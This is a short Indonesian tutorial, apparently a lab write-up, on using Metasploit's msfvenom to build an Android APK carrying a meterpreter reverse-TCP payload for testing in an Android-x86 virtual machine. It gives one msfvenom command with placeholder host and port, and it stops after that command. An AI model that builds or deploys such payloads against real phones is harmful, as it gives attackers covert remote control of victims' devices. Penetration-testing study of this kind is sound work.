# Membuat payload android dengan msfvenom

Dalam metasploit framework ada salah satu alat yang berfungsi untuk membuat payload (malicious code / shellcode) yaitu msfvenom. Msfvenom biasa digunakn untuk tujuan penetration testing terkontrol hingga exploit development karena penggunaanya yang mudah dan fungsi yang luas. Namun karena Metasploit merupakan framework berbasis open-source, payload yang dihasilkan oleh msfvenom menjadi mudah dikenali. Oleh karena itu payload ini jarang digunakan dalam penetration testing profesional karena anti-virus dan sistem keamanan lainnya dapat mengenali signaturenya dengan mudah.

Saya akan mencoba membuat payload android dengan msfvenom dan menggunakannya di virtual machine Android-x86 

## Membuat payload 

Untuk membuat shellcode android dengan msfvenom kita dapat menggunakan payload */android/meterpreter/reverse_tcp* yang akan membuat sebuah file aplikasi yang berisi payload reverse shell menggunakan protokol tcp.

```bash
msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP_tujuan> LPORT=<PORT_tujuan> -o <hasil_output>
```
